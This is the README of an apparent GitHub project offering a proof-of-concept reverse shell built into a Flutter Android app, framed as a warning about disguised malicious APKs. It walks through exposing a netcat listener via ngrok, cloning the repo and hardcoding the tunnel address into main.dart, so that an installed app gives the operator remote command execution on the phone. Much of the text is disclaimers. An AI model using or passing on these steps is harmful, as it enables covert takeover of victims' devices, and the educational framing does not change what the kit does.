# Image and Video
![WhatsApp Image 2024-11-11 at 21 11 55_b7409444](https://github.com/user-attachments/assets/813ce3b6-427e-420e-b265-6d44345741c1)
![image](https://github.com/user-attachments/assets/722a4ca1-d29f-4317-a4ac-f7615171ac67)
![image](https://github.com/user-attachments/assets/78edfea9-c019-443d-944c-0ea58b7c522c)

# POC Reverse Shell With Flutter Application

I’m sharing a proof of concept demonstrating how a reverse shell can be implemented within a Flutter application. This is a reminder to always download apps only from trusted sources. Malicious APKs can easily disguise themselves as legitimate apps, like "kad kahwin.apk."

I built this example app entirely in Flutter to show how vulnerabilities can appear even in custom applications, highlighting the need for caution when installing software.

This post is for educational purposes only, aimed at raising awareness about mobile app security. Please remember: avoid downloading apps from unverified sources! 🔒

Attention all resources shared here should only be used with proper permission. Do not use them for any harmful or illegal activities. Stay responsible. Great Power Comes Great Responsibility.

# Installation 
setup ngrok
- ./ngrok authtoken <your_auth_token>
- ./ngrok tcp 443 
- dig 2.tcp.ngrok.io (check ip address ngrok)
*take note of ngrok port and ip address:

setup listener
- nc -lvnp 443

clone repo
- git clone https://github.com/NormanSamsudin/poc-flutter-reverse-shell.git
 
configure reverse shell
- change ip address and port of "ngrok" on file main.dart [ip address: 3.22.53.161, port: 12875] 

# ⚠️ Security Warnings for Reverse Shell Flutter Project

## 🔒 High Risk of Unauthorized Access
- **Reverse Shell Functionality**: This app includes a reverse shell, allowing remote command execution on the device. Unauthorized or malicious use of this feature can lead to a full compromise of device security.

## ⛔ Educational and Controlled Use Only
- **Restricted Usage**: Intended solely for educational purposes in a secure, controlled environment. This app should not be deployed in public or unsecured settings.

## ⚖️ Legal and Ethical Considerations
- **Compliance with Laws**: Unauthorized access to devices is illegal in many regions. Ensure all usage complies with local, state, and federal laws.
- **Ethical Usage**: Employ this app responsibly. Do not use it to cause harm or to access devices and networks without explicit permission.

## 🌐 Network Security Risks
- **Unsecured Network Traffic**: The reverse shell may transmit unencrypted data, exposing sensitive information. Use robust network protections, including firewalls, when testing or deploying this app.

## ☠️ Risk of Misuse as Malware
- **Malware Risks**: The capabilities of this tool could resemble malware. Be aware that antivirus software might flag or restrict this app.

## ❗ Disclaimer
- **Educational Use Only**: This project is solely intended for educational purposes. Unauthorized use or misuse is prohibited. Users must obtain explicit authorization before using this tool on any network or system.



